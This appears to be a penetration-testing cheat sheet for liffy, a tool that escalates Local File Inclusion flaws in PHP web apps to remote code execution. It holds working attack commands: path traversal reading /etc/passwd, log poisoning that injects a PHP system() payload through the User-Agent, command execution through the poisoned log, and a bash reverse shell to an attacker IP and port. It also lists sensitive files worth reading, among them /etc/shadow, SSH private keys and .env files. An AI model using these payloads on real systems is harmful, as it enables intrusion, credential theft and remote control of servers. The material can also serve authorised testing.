# liffy

**Tags:** `#lfi` `#localfileinclusion` `#rce` `#webappsec` `#web`

Local File Inclusion exploitation tool. Takes a confirmed LFI URL and attempts escalation to RCE via multiple techniques — log poisoning, /proc/self/environ, PHP wrappers, and file descriptor injection. Modular design with separate exploit modules for each technique.

**Source:** https://github.com/mzfr/liffy
**Install:**
```bash
git clone https://github.com/mzfr/liffy.git
cd liffy
pip install -r requirements.txt
```

> [!note]
> liffy focuses on LFI escalation (not detection) — provide a confirmed LFI URL. Use with caution on production — log poisoning writes to server logs. The three LFI tools (liffy, LFiFreak, LFI Suite) overlap significantly; pick one or use manual Burp testing for complex cases.

---

## Usage

```bash
# Environ module — /proc/self/environ poisoning
python liffy.py -u "http://target.com/page.php?file=" -e

# Log module — Apache/Nginx log poisoning
python liffy.py -u "http://target.com/page.php?file=" -l

# PHP input wrapper
python liffy.py -u "http://target.com/page.php?file=" -p

# PHP filter (read source — no RCE)
python liffy.py -u "http://target.com/page.php?file=" -f

# SMTP log poisoning (inject via mail header)
python liffy.py -u "http://target.com/page.php?file=" -s

# SSH log poisoning (inject via SSH username)
python liffy.py -u "http://target.com/page.php?file=" -ss
```

---

## Modules

| Flag | Module | Technique |
|------|--------|-----------|
| `-e` | environ | `/proc/self/environ` poison via User-Agent |
| `-l` | logs | Apache/Nginx access log poison via User-Agent |
| `-p` | phpinput | `php://input` wrapper (POST body as PHP) |
| `-f` | phpfilter | `php://filter` (read source, no RCE) |
| `-s` | smtp | SMTP log poison (`/var/log/mail.log`) |
| `-ss` | ssh | SSH auth log poison (`/var/log/auth.log`) |

---

## Manual LFI to RCE — Quick Reference

```bash
# Confirm LFI — read /etc/passwd
curl "http://target.com/page.php?file=../../../../etc/passwd"

# Check what logs are readable
curl "http://target.com/page.php?file=../../../../var/log/apache2/access.log"
curl "http://target.com/page.php?file=../../../../var/log/nginx/access.log"
curl "http://target.com/page.php?file=../../../../proc/self/environ"

# Log poison — inject PHP via User-Agent
curl -s "http://target.com/" -A "<?php system(\$_GET['cmd']); ?>"

# Execute via LFI + cmd param
curl "http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=id"

# Upgrade to reverse shell via cmd
# URL-encode the bash reverse shell:
CMD="bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'"
curl "http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=$CMD"
```

---

## Common LFI Paths — Quick Reference

```
Linux:
/etc/passwd
/etc/shadow
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/var/mail/www-data
/home/user/.ssh/id_rsa
/var/www/html/.env
/var/www/html/config.php

Windows:
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\xampp\apache\logs\access.log
C:\inetpub\logs\LogFiles\W3SVC1\
C:\inetpub\wwwroot\web.config
```

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
